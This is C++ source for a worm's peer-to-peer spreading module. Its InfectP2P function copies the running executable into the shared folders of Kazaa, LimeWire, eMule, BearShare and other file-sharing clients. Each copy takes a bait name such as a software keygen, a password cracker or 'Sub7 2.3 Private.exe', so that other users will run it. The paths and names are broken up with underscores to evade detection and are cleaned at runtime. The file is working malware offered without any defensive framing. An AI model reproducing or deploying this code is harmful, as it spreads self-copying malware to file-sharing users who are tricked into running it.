#include "Peer2Peer.h"
#include <algorithm>
#include <string>

struct Peer2PeerInfo_s
{
   char szDirectory[MAX_PATH];
   char szFilePath[MAX_PATH];
};


const char *szPath[] =
{
    "C:\\pro_gram fi_les\\kaz",
    "C:\\pro_gram fi_les\\kaz",
    "C:\\pro_gram fi_les\\kaz",
    "C:\\pro_gram fi_les\\ic",
    "C:\\pro_gram fi_les\\gro",
    "C:\\pro_gram fi_les\\bear",
    "C:\\pro_gram fi_les\\edonk",
    "C:\\pro_gram fi_les\\emu",
    "C:\\pro_gram fi_les\\mor",
    "C:\\pro_gram fi_les\\li",
    "C:\\pro_gram fi_les\\te",
    "C:\\pro_gram fi_les\\wi"
};

const char *szPathAdd[] =
{
    "aa\\m_y shar_ed fol_der\\",
    "aa li_te\\my sha_red fold_er\\",
    "aa lit_e k++\\my sh_ared fol_der\\",
    "q\\shar_ed fol_der\\",
    "kster\\my grok_ster\\",
    "sh_are\\sh_ared\\",
    "ey20_00\\inc_oming\\",
    "le\\inc_oming\\",
    "ph_eus\\my sha_red fold_er\\",
    "mew_ire\\sha_red\\",
    "sla\\fi_les\\",
    "nmx\\sh_ared\\"
};
const char *szFiles[] =
{
    "Windows 2003 Advanced Server KeyGen.exe",
    "UT 2003 KeyGen.exe",
    "Half-Life 2 Downloader.exe",
    "Password C_R_A_C_K_E_R.exe",
    "FTP C_R_A_C_K_E_R.exe",
    "Brutus FTP C_R_A_C_K_E_R.exe",
    "Hotmail Hacker.exe",
    "Hotmail C_R_A_C_K_E_R.exe",
    "Windows.Vista.32.bit.C_R_A_C_K.by.RELOADED.exe",
    "Norton Anti-Virus 2008 Enterprise C_R_A_C_K.exe",
    "DCOM E_X_P_L_O_I_T.exe",
    "NetBIOS Hacker.exe",
    "NetBIOS C_R_A_C_K_E_R.exe",
    "Windows Password C_R_A_C_K_E_R.exe",
    "L0pht 4.0 Windows Password C_R_A_C_K_E_R.exe",
    "sdbot with NetBIOS Spread.exe",
    "Sub7 2.3 Private.exe",
    "Microsoft Visual C++ KeyGen.exe",
    "Microsoft Visual Basic KeyGen.exe",
    "Microsoft Visual Studio KeyGen.exe",
    "MSN Password C_R_A_C_K_E_R.exe",
    "AOL Instant Messenger (AIM) Hacker.exe",
    "ICQ Hacker.exe",
    "AOL Password C_R_A_C_K_E_R.exe",
    "Keylogger.exe",
    "Website Hacker.exe",
    "IP Nuker.exe",
    "Counter-Strike KeyGen.exe",
    "DivX 5.0 Pro KeyGen.exe"
};

bool InfectP2P()
{
    Peer2PeerInfo_s pPeer2PeerInfo_s;

    if (&pPeer2PeerInfo_s)
        ZeroMemory(&pPeer2PeerInfo_s, sizeof(Peer2PeerInfo_s));
    else
        ExitThread(0);

    GetModuleFileNameA(GetModuleHandle(NULL), pPeer2PeerInfo_s.szDirectory, sizeof(pPeer2PeerInfo_s.szDirectory));
    for (int i = 0; i < (sizeof(szPath) / sizeof(LPTSTR)); i++)
    {
        for (int j = 0; j < (sizeof(szFiles) / sizeof(LPTSTR)); j++)
        {
            strcpy(pPeer2PeerInfo_s.szFilePath, szPath[i]);
            strcat(pPeer2PeerInfo_s.szFilePath, szPathAdd[i]);
            strcat(pPeer2PeerInfo_s.szFilePath, szFiles[j]);
			std::string str(pPeer2PeerInfo_s.szFilePath);
			str.erase(std::remove(str.begin(), str.end(), '_'), str.end());
			if (CopyFileA(pPeer2PeerInfo_s.szDirectory, str.c_str(), false) != 0)
            {
                SetFileAttributesA(pPeer2PeerInfo_s.szFilePath, FILE_ATTRIBUTE_NORMAL);
            }
        }
    }
    return true;
}
